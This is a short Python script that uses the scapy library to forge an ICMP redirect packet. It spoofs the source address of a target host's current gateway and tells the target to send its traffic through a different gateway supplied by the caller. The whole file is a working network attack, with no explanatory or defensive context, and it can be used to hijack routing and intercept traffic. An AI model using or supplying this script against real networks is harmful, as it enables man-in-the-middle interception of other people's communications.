from scapy.layers.inet import ICMP, IP
from scapy.sendrecv import send


def main(target: str, old_gw: str, new_gw: str):
    # Construct and send the packet
    packet = (
        IP(src=old_gw, dst=target)
        / ICMP(type=5, code=1, gw=new_gw)
        / IP(src=target, dst="0.0.0.0")
    )
    send(packet)
    return 0
